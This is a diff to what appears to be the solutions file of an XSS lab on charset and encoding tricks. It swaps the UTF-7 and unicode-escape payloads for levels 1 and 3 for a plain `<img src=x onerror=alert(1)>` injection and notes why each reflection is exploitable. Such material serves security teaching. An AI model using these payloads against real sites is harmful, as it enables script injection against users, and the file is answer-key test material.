@@ -4,10 +4,10 @@ Charset and encoding tricks (UTF-7, partial entity encode, JS string escape, JSO
 
 ### encmix-level1
 
-`/encmix/level1/?query=%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-`
+`/encmix/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
-- context: Content-Type charset=utf-7; UTF-7 encoded `<script>` decoded by browser
+- payload: `<img src=x onerror=alert(1)>`
+- context: charset=utf-7 is ignored by modern browsers and the reflection is raw
 
 ### encmix-level2
 
@@ -21,10 +21,10 @@ Charset and encoding tricks (UTF-7, partial entity encode, JS string escape, JSO
 
 ### encmix-level3
 
-`/encmix/level3/?query=%5Cu003cimg%20src=x%20onerror=alert(1)%5Cu003e`
+`/encmix/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
 - payload: `<img src=x onerror=alert(1)>`
-- context: inside JS single-quoted string then innerHTML; `\u` escapes survive gsub and JS decodes
+- context: only `\` and `'` are escaped in the JS string; raw angle brackets reach innerHTML
 
 ### encmix-level4
 
